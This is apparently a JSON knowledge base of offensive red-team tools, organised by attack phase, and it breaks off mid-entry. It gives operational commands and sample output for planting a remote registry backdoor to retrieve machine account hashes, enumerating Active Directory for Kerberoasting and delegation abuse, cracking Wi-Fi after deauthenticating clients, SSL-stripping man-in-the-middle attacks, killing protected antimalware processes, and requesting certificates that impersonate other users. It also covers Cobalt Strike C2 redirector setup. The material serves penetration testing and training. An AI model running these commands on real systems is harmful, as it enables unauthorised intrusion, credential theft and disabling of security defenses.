[
  {
    "name": "Add-RemoteRegBackdoor",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/HarmJ0y/DAMP/blob/master/Add-RemoteRegBackdoor.ps1",
    "description": "Implements a new remote registry backdoor that allows for the remote retrieval of a system's machine account hash.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Remote Registry]]\n'Add-RemoteRegBackdoor' can be run locally on a compromised machine, or remotely with credentials.\n'''beacon\nbeacon> run hostname\nsrv2\n\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n\nbeacon> powershell Add-RemoteRegBackdoor -Trustee EDU\\john\nComputerName BackdoorTrustee\n------------ ---------------\nSRV2        EDU\\john\n'''\n\n'''beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> ls \\\\srv2\\c$\n[-] could not open \\\\srv2\\c$\\*: 5\n\nbeacon> powershell Get-RemoteMachineAccountHash -ComputerName srv2\n\nComputerName MachineAccountHash              \n------------ ------------------              \nsrv2        5d0d485386727a8a92498a2c188627ec\n'''\n\n\n",
    "commands": [
      {
        "id": "707832f8-a129-4e7c-a159-ef62d11bb1e5",
        "name": "Add-RemoteRegBackdoor",
        "description": "Implements a new remote registry backdoor that allows for the remote retrieval of a system's machine account hash.",
        "cmd": "powershell Add-RemoteRegBackdoor -Trustee EDU\\john",
        "tag": "GatherAccountHashBackdoor",
        "results": []
      }
    ],
    "latest_commit": "2019-07-25T21:18:37Z"
  },
  {
    "name": "ADReaper",
    "phases": [
      "06. Domain Enumeration",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows",
      "Linux"
    ],
    "source": "https://github.com/AidenPearce369/ADReaper",
    "description": "ADReaper is a tool written in Golang which enumerates an Active Directory environment with LDAP queries within few seconds",
    "undetected": [],
    "detected": [],
    "content": "# ADReacon\n\n## Commands\nADReaper performs enumeration with various commands that performs LDAP queries with respective to it\n```\nPS C:\\Users\\redteamer\\Desktop\\shared>.\\ADReaper.exe\n\n      -command string\n\n            Command to run\n                  dc              - to list domain controllers\n                  domain-trust    - to list domain trust\n                  users           - to list all users\n                  computers       - to list all computers\n                  groups          - to list all groups with members\n                  spn             - to list service principal objects\n                  never-loggedon  - to list users never logged on\n                  gpo             - to list group policy objects\n                  ou              - to list organizational units\n                  ms-sql          - to list MS-SQL servers\n                  asreproast      - to list AS-REP roastable accounts\n                  unconstrained   - to list Unconstrained Delegated accounts\n                  admin-priv      - to list AD objects with admin privilege\n\n      -dc string\n\n            Enter the DC\n\n      -filter string\n\n            Filters to use for users/groups/computers\n\n            list - lists all objects only\n            fulldata - list all objects with properties\n            membership - lists all members from an object\n\n            (default \"list\")\n      -name string\n\n            Pass object name of user/group/computer\n\n      -password string\n\n            Enter the Password\n\n      -user string\n\n            Enter the Username\n```\n\nTo list OUs from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ou\n```\n\nTo list AD objects with higher privileges,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command admin-priv\n```\n\n## [[Domain Controller]]\nTo query the properties of Domain Controller of the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command dc\n```\n\n## [[Domain Trust]]\nTo query the Trust Attributes of the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command domain-trust\n```\n\n## [[Domain Users]]\nTo list all Users from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users\n```\n\nTo list all Users with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -filter full-data\n```\n\nTo list attributes of Specific Users from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -name <user>\n```\n\nTo list the membership of the Specific User,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -name <user> -filter membership\n```\n\n## [[Domain Computers]]\nTo list all available Computers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers\n```\n\nTo list all Computers with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers -filter full-data\n```\n\nTo list attributes of Specific Computer from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers -name <computer name>\n```\n\n## [[Domain Groups]]\nTo list all available Groups from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups\n```\n\nTo list all Groups with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -filter full-data\n```\n\nTo list attributes of Specific Group from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -name <group name>\n```\n\nTo list members of Specific Group from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -name <group name> -filter membership\n```\n\nTo list users Never Logged On from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command never-loggedon\n```\n\n## [[Domain GPOs]]\nTo list GPOs from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command gpo\n```\n\n## [[Database Server]]\nTo list MS-SQL Servers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql\n```\n\nTo list all attributes of MS-SQL Servers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql -filter full-data.\n```\n\nTo list all attributes of specific MS-SQL Server from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql -name <computer name> \n```\n\n## [[Domain SPN]]\nTo list SPNs available in the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command spn\n```\n\nTo list all attributes of Specific SPN from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command spn -name <sam of spn>\n```\n\n## [[Unconstrained Delegation]]\nTo list AD objects with Unconstrained Delegation enabled,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command unconstrained \n```\n\n\n",
    "commands": [],
    "latest_commit": "2023-01-14T15:01:36Z"
  },
  {
    "name": "ADSearch",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "Enumeration",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/tomcarver16/ADSearch",
    "description": "Has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom LDAP queries which can be powerful",
    "undetected": [],
    "detected": [],
    "content": "# ADSearch\n\n## Commands\nGet all groups ending with \"Admins\"\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(objectCategory=group)(cn=*Admins))\"\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 6\n[+] cn : Domain Admins\n[+] cn : Key Admins\n[+] cn : DnsAdmins\n[+] cn : Oracle Admins\n[+] cn : Subsidiary Admins\n[+] cn : MS SQL Admins\n``````\n\n## [[Kerberoasting]]\nIdentify Kerberoastable user\n``````beacon\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(sAMAccountType=805306368)(servicePrincipalName=*))\"\n  \n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 2\n [+] cn : krbtgt\n [+] cn : MS SQL Service\n [+] cn : Honey Service\n``````\n\n## [[AS-REP Roasting]]\nIdentify AS-Reproastable user\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 1\n [+] cn                : Oracle Service\n [+] distinguishedname : CN=Oracle Service,CN=Users,DC=edu,DC=evil,DC=corp\n [+] samaccountname    : svc_oracle\n``````\n\n## [[Unconstrained Delegation]]\nIdentify unconstrained delegation\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname,operatingsystem\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 2\n [+] samaccountname     : DC-2$\n [+] dnshostname        : dc-2.edu.evil.corp\n [+] operatingsystem    : Windows Server 2016 Datacenter\n\n [+] samaccountname     : SRV1$\n [+] dnshostname        : srv1.edu.evil.corp\n [+] operatingsystem    : Windows Server 2016 Datacenter\n``````\n\n## [[Constrained Delegation]]\nIdentify constrained delegation\n[[PowerView#Constrained Delegation]]\nFind all computers configured for constrained delegation and what they're allowed to delegate to (we need the `--json` output to drill down into the `msds-allowedtodelegateto` attribute).\n``````beacon\nbeacon> execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Debug\\ADSearch.exe --search \"(&(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json\n\n[*] No domain supplied. This PC's domain will be used instead\n[*] LDAP://DC=edu,DC=evil,DC=corp\n[*] CUSTOM SEARCH: \n[*] TOTAL NUMBER OF SEARCH RESULTS: 1\n[\n  {\n \"cn\": \"SRV2\",\n \"dnshostname\": \"srv2.edu.evil.corp\",\n \"samaccountname\": \"SRV2$\",\n \"msds-allowedtodelegateto\": [\n \"eventlog/dc-2.edu.evil.corp/edu.evil.corp\",\n \"eventlog/dc-2.edu.evil.corp\",\n \"eventlog/DC-2\",\n \"eventlog/dc-2.edu.evil.corp/EDU\",\n \"eventlog/DC-2/EDU\",\n \"cifs/wkstn2.edu.evil.corp\",\n \"cifs/WKSTN2\"\n ]\n  }\n]\n``````\n\n\n",
    "commands": [],
    "latest_commit": "2022-12-08T10:44:38Z"
  },
  {
    "name": "aircrack-ng",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://www.aircrack-ng.org/",
    "description": "Aircrack-ng is a complete suite of tools to assess Wi-Fi network security.",
    "undetected": [],
    "detected": [],
    "content": "# aircrack-ng\n\n'''java\napt-get install aircrack-ng -y\n'''\n\n## [[WiFi crack]]\n'''java\n//Set wificard in monitor mode (monitor.sh)\nIfconfig\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> take wlan card name\nIfconfig name down\u00a0\u00a0\u00a0\u00a0 //runterfahren\nIfconfig name mode monitor\nIfconfig name up\nIwconfig name | grep Mode\n\n//Change MAC\n\n\n//Check if prozess interfering! IF KILL\nAirmon-ng check name\nKill 1312 (Networkmanager)\nKill\u00a017917 (dhclient)\nKill 1556, 1215, 1216\n\n//Netzwerk sniffen\nAirodump-ng name\nAirodumo -c [channel] -w [FILE] --bsssid [MAC]\nAirplay-ng -0 0 -a [MAC]              //deauthenticate dauerhaft\nAircrack-ng -w [word list] capture.cap\n\n//Change networkcard channel to Router channel\nAireplay-ng -0 0 -a [MAC] name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> get channel + MAC(bssid)\nIwconfig name channel 6\n'''\n\n\n",
    "commands": [
      {
        "id": "0a82bdb0-4e8d-4dfa-b855-0194965b85a9",
        "name": "Activate monitor mode",
        "description": "Get the interface and put it into monitoring mode",
        "tag": "",
        "results": [],
        "cmd": "Ifconfig\nIfconfig <if> down\nIfconfig <if> mode monitor\nIfconfig <if> up\nIwconfig <if> | grep Mode"
      },
      {
        "id": "609c27b6-c698-4641-b262-5afbf527920f",
        "name": "Check for interfering processes",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "airmon-ng check <if>"
      },
      {
        "id": "8fac72ec-9855-4a68-a334-024d5303eb07",
        "name": "Sniff network",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Airodump-ng name\nAirodump -c [channel] -w [FILE] --bsssid [MAC]"
      },
      {
        "id": "9969180d-e48a-4a57-8b78-d249bdfee6fd",
        "name": "Deauth device",
        "description": "Deauthenticate a device permanently",
        "tag": "",
        "results": [],
        "cmd": "Airplay-ng -0 0 -a [MAC]"
      },
      {
        "id": "47ad1864-2180-4d2b-9e28-a23c55d1d5dc",
        "name": "Aircrack with wordlist",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Aircrack-ng -w [word list] capture.cap"
      },
      {
        "id": "047b2311-6a3d-4e2d-8e89-fcde97fa3575",
        "name": "Change interface channel",
        "description": "Change network card channel to router channel",
        "tag": "",
        "results": [],
        "cmd": "Aireplay-ng -0 0 -a [MAC] <if>\nIwconfig <if> channel <6>"
      }
    ]
  },
  {
    "name": "Amass",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Cross platforms (GO)"
    ],
    "source": "https://github.com/owasp-amass/amass",
    "description": "The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Exposed Machines]]\nScan for external machines\n\n",
    "commands": [
      {
        "id": "3d58a22c-e1ee-41b2-9c68-5a64efba043b",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "wget https://github.com/owasp-amass/amass/releases/latest"
      }
    ],
    "latest_commit": "2023-05-12T17:52:14Z"
  },
  {
    "name": "API Monitor",
    "phases": [
      "04. Persistence"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "http//www.rohitab.com/",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "# API Monitor\n\n## [[Search Order Hijacking]]\nDLL Search Order Hijacking\n\n\n",
    "commands": []
  },
  {
    "name": "ASN Editor",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/PKISolutions/Asn1Editor.WPF",
    "description": "Change a bit in the ticket in order to change the service",
    "undetected": [],
    "detected": [],
    "content": "\n## [[S4U2self Abuse]]\nTo modify a ticket, open it with the ASN Editor.  Find the two instances where the **GENERAL STRING** \"WKSTN2$\" appears. ![](/Images/Pasted%20image%2020220316222605.png)\nDouble-click them to open the **Node Content Editor** and replace these strings with \"cifs\".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent **SEQUENCE** and select **New**.  Enter **1b** in the **Tag** field and click **OK**.  Double-click on the new node to edit the text.\n ![](/Images/Pasted%20image%2020220316222614.png)\n\n",
    "commands": [],
    "latest_commit": "2021-10-12T09:42:15Z"
  },
  {
    "name": "AzureC2Relay",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/Flangvik/AzureC2Relay",
    "description": "AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[00.Infrastructure/Redirector]]\n\n",
    "commands": [
      {
        "id": "7ea9d673-38f7-4dcf-9edb-ce11f6ec69b2",
        "name": "Deploy Azure function",
        "description": "Spawn an redirector via Azure functions",
        "tag": "",
        "results": [],
        "cmd": "&([scriptblock]::Create((Invoke-WebRequest -UseBasicParsing 'https://dot.net/v1/dotnet-install.ps1'))) -runtime dotnet -version 3.1.0\nInvoke-WebRequest 'https://releases.hashicorp.com/terraform/0.14.6/terraform_0.14.6_windows_amd64.zip'  -OutFile 'terraform.zip'\nExpand-Archive -Path terraform.zip -DestinationPath \"$([Environment]::GetFolderPath('ApplicationData'))\\TerraForm\\\"\nsetx PATH \"%PATH%;$([Environment]::GetFolderPath('ApplicationData'))\\TerraForm\\\"\nInvoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\\AzureCLI.msi"
      }
    ],
    "latest_commit": "2021-02-15T18:06:38Z"
  },
  {
    "name": "Backstab",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/Yaxser/Backstab",
    "description": "A tool to kill antimalware protected processes",
    "undetected": [],
    "detected": [],
    "content": "\nHere is a quick rundown of what happens\n1. Embedded driver is dropped to disk\n2. Registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services is created\n3. The privilege SE_PRIVILEGE_ENABLED is acquired because it is necessary to load the driver\n4. Driver is loaded using NtLoadDriver to avoid creating a service\n5. The created Registry key is deleted (service not visible during execution)\n6. Communication with the driver is via using DeviceIoControl\n7. For handle enumeration, NtQuerySystemInformation is called\n\nWhat you should also know\n1. The behavior of the tool mimics that of ProcExp. ProcExp drops the driver to the disk, create registry key under\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services, calls NtLoadDriver, and then delete the registry key\n2. You can specify the location to which the driver is dropped and the service name\n3. When done, the app will unload the driver. The driver is unloaded by first re-creating the registry keys and then calling NtUnloadDriver\n4. The loaded driver is signed by MS\n5. The process does not attempt to directly kill protected processes handles, it instructs ProcExp driver to kill them. You won't be accused of attempting to tamper with any processes\n\n## [[Signed drivers]]\n```cmd\nUsage: backstab.exe <-n name || -p PID> [options]  \n\t-n,\tChoose process by name, including the .exe suffix\n\t-p, \tChoose process by PID\n\t-l, \tList handles of protected process\n\t-k, \tKill the protected process by closing its handles\n\t-x, \tClose a specific handle\n\t-d, \tSpecify path to where ProcExp will be extracted\n\t-s, \tSpecify service name registry key\n\t-u, \tUnload ProcExp driver\n\t-a,\tadds SeDebugPrivilege\n\t-h, \tPrint this menu\n\n\tExamples:\n\tbackstab.exe -n cyserver.exe -k \t\t\t[kill cyserver]\n\tbackstab.exe -n cyserver.exe -x E4C \t\t[Close handle E4C of cyserver]\n\tbackstab.exe -n cyserver.exe -l \t\t\t[list all handles of cyserver]\n\tbackstab.exe -p 4326 -k -d c:\\\\driver.sys \t[kill protected process with PID 4326, extract ProcExp driver to C:\\ drive]\n```\n\n\n",
    "commands": [],
    "latest_commit": "2021-06-19T20:01:52Z"
  },
  {
    "name": "Bettercap",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/bettercap/bettercap",
    "description": "A suite for man in the middle attacks",
    "undetected": [],
    "detected": [],
    "content": "Bettercap\n---------\n\n[https://www.bettercap.org/usage/](https://www.bettercap.org/usage/)\n\nMitM with [sslstrip](sslstrip_1297023162.html)\n\n(May not work because of HSTS and the preload list containing websites that need to be HTTPS even on first connect)\n\n## [[08.Credentials & User Impersonation/MITM]]\n'''java\nbettercap -G 192.168.1.1 -T 192.168.1.102 --proxy-https\n'''\n\n\n",
    "commands": [
      {
        "id": "aae91a7b-6ae0-4c0b-b3d5-1298930bfe14",
        "name": "MITM with SSL Stripping",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "bettercap -G 192.168.1.1 -T 192.168.1.102 --proxy-https"
      }
    ],
    "latest_commit": "2023-03-15T15:07:33Z"
  },
  {
    "name": "BloodHound",
    "phases": [
      "06. Domain Enumeration",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/BloodHoundAD/BloodHound",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "# BloodHound\n\nBloodHound is an application that uses graph theory to display the relationships between different Active Directory components, specifically for the use case of finding attack paths. BloodHound requires the use of two additional components: a [neo4j](https://neo4j.com/) database and the [[SharpHound]] data collector.\n\n#OPSEC Running collection methods such as **LocalAdmin**, **RDP**, **DCOM**, **PSRemote** and **LoggedOn** will allow SharpHound to enumerate every single computer in the domain. Collecting this information is useful to BloodHound and without it you may see fewer paths, at the obvious expensive of being loud on the wire.\n\n## Custom Queries\n### [[Kerberoasting]]\n- Kerberoastable users\n>MATCH (u:User {hasspn:true}) RETURN u\n- With paths to computers\n>MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p\n- List of kerberoastable users with groups\n> MATCH (m:User {hasspn:true}), (n:Group), p=(m)-[:MemberOf]->(n) RETURN m.name as Account, n.name as Group, m.hasspn as Kerberoastable\n### [[AS-REP Roasting]]\n- AS-REP roastable users\n>MATCH (u:User {dontreqpreauth:true}) RETURN u\n\n### [[Unconstrained Delegation]]\n>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c\n\n## [[Constrained Delegation]]\n\u2139\ufe0f Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.\n>MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p\n\n### [[Group Policy (GPO)]]\nGeneric Write on GPOs\n>MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p\n\n### WriteProperty, WriteDacl, WriteOwner affecting OU\n1st Line Support has **GenericAll** on multiple users and groups\n>MATCH (g1:Group {name:\"1ST LINE SUPPORT@edu.evil.corp\"}), (g2:Group), p=((g1)-[:GenericAll]->(g2)) RETURN p\n\n## [[Database Server]]\nFinding potential MS SQL Admins, based on the assumption that the account running the SQL Service is also a sysadmin (which is very common);\n>MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p\n\n## [[Local Administrator Password Solution (LAPS)]]\nFind computers that have LAPS applied to them:\n>MATCH (c:Computer {haslaps: true}) RETURN c\n\nAny groups that have an edge to machines via LAPS:\n>MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p\n\n",
    "commands": [],
    "latest_commit": "2023-05-13T17:30:53Z"
  },
  {
    "name": "C2concealer",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/FortyNorthSecurity/C2concealer",
    "description": "C2concealer is a command line tool that generates randomized C2 malleable profiles for use in Cobalt Strike.",
    "undetected": [],
    "detected": [],
    "content": "\n\n## [[Cobalt Strike]]\n\n",
    "commands": [
      {
        "id": "8e0dc6a7-a1fc-4a1e-ac0f-0dfe239cd961",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "chmod u+x install.sh\n./install.sh"
      },
      {
        "id": "faac6737-b5fa-419c-b71a-2be384f8743f",
        "name": "Generate malleable profile",
        "description": "Generate malleable profile with 3 HTTP client/server variants",
        "tag": "",
        "results": [],
        "cmd": "C2concealer --hostname google.com --variant 3"
      }
    ],
    "latest_commit": "2021-09-26T16:37:06Z"
  },
  {
    "name": "Certify",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/GhostPack/Certify",
    "description": "Used to query certificate information for [[Misconfigured Certificate Templates]]",
    "undetected": [],
    "detected": [],
    "content": "# Certify\n\n## [[Misconfigured Certificate Templates]]\nGet certificat details\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe cas\n\n[*] Root CAs\n\n Cert SubjectName              : CN=ca-1, DC=evil, DC=corp\n Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668\n Cert Start Date               : 2/25/2022 11:29:14 AM\n Cert End Date                 : 2/25/2047 11:39:08 AM\n Cert Chain                    : CN=ca-1,DC=evil,DC=corp\n\n[*] Enterprise/Enrollment CAs:\n\n Enterprise CA Name            : ca-1\n DNS Hostname                  : dc-1.evil.corp\n FullName                      : dc-1.evil.corp\\ca-1\n Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n Cert SubjectName              : CN=ca-1, DC=evil, DC=corp\n Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668\n Cert Start Date               : 2/25/2022 11:29:14 AM\n Cert End Date                 : 2/25/2047 11:39:08 AM\n Cert Chain                    : CN=ca-1,DC=evil,DC=corp\n\n Enterprise CA Name            : ca-2\n DNS Hostname                  : dc-2.edu.evil.corp\n FullName                      : dc-2.edu.evil.corp\\ca-2\n Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n Cert SubjectName              : CN=ca-2, DC=edu, DC=evil, DC=corp\n Cert Thumbprint               : 2D0349C77D35808E35A7C6815CF37B51D9A5D431\n Cert Serial                   : 64000000067ED180604220703C000000000006\n Cert Start Date               : 3/1/2022 10:45:07 AM\n Cert End Date                 : 3/1/2024 10:55:07 AM\n Cert Chain                    : CN=ca-1,DC=evil,DC=corp -> CN=ca-2,DC=edu,DC=evil,DC=corp\n``````\n\n## Find vulnerable certificates\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /vulnerable\n``````\n\n## Request certificate for user\nThis configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain.  Request a certificate.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request /ca:dc-1.evil.corp\\ca-1 /template:VulnerableUserTemplate /altname:nglover\n\n[*] Action: Request a Certificates\n\n[*] Current user context    : EDU\\patrick\n[*] No subject name specified, using current context as subject.\n\n[*] Template                : VulnerableUserTemplate\n[*] Subject                 : CN=Isabel Yates, CN=Users, DC=evil, DC=corp\n[*] AltName                 : nglover\n\n[*] Certificate Authority   : dc-1.evil.corp\\ca-1\n\n[*] CA Response             : The certificate had been issued.\n[*] Request ID              : 4\n\n[*] cert.pem         :\n\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA7+QJhT7SgrP2SLWI7JqilriLBFjGRgob7sK6Gt8/EN4ODCqA\n[...snip...]\nEZCgtNFHJpynmPVNEcocncFPtV1hskXIElcwer/EdIROOW+qZhan\n-----END RSA PRIVATE KEY-----\n-----BEGIN CERTIFICATE-----\nMIIGKzCCBROgAwIBAgITIQAAAAJ1qRjA3m3TOAAAAAAAAjANBgkqhkiG9w0BAQsF\n[...snip...]\nXm58FnNpAvwXQi1Vu+xIdtpRSGsnl6T6/TYwJlhKqMEU9mRfgaWXgLS+HdS++aw=\n-----END CERTIFICATE-----\n\n[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\nCertify completed in 00:00:16.3844085\n``````\n\n## Request certificate for machine\nThe `/machine` parameter tells Certify to auto-elevate to SYSTEM and assume the identity of the machine account (for which you need to be running in high-integrity).\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request /ca:dc-2.edu.evil.corp\\ca-2 /template:Machine /machine\n``````\n\n## [[User & Computer Persistence]]\nFind all certificates that permit client auth\nTo limit the volume of output, we can only return templates from the CA in our current domain, using `/ca:dc-2.edu.evil.corp\\ca-2`\n\nRequirements (default):\n- Authorized Signatures Required: `0`\n- Enrollment Rights: `domain\\Domain Users`\n- Validity Period: `1 year`\n\n``````\nbeacon> getuid\n[*] You are EDU\\patrick\n\nbeacon> execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe find /clientauth\n``````\n\n\n\n",
    "commands": [],
    "latest_commit": "2023-01-27T05:23:32Z"
  },
  {
    "name": "Cewl",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/digininja/CeWL",
    "description": "Password list generator",
    "undetected": [],
    "detected": [],
    "content": "# Cewl\n\n## [[Password Spraying]]\nSpider and build dictionary\n'''\ncewl -w createWordlist.txt https://www.example.com\n'''\n\nAdd minimum password length:\n'''\ncewl -w createWordlist.txt -m 6 https://www.example.com\n'''\n\n\n",
    "commands": [
      {
        "id": "f715c0ee-840f-481c-9999-e8dc102ea5cc",
        "name": "Build dict from web",
        "description": "Spider and build dictionary from website",
        "tag": "",
        "results": [],
        "cmd": "cewl -w createWordlist.txt https://www.example.com"
      },
      {
        "id": "ba34fd28-316f-4d8c-99a2-464b6f5e03e4",
        "name": "Build dict from web min pw length",
        "description": "Spider and build dictionary from website with a minimum password length",
        "tag": "",
        "results": [],
        "cmd": "cewl -w createWordlist.txt -m 6 https://www.example.com"
      }
    ],
    "latest_commit": "2023-04-12T05:49:41Z"
  },
  {
    "name": "Chameleon",
    "phases": [
      "00. Infrastructure",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/mdsecactivebreach/Chameleon",
    "description": "A tool for domain categorisation",
    "undetected": [],
    "detected": [],
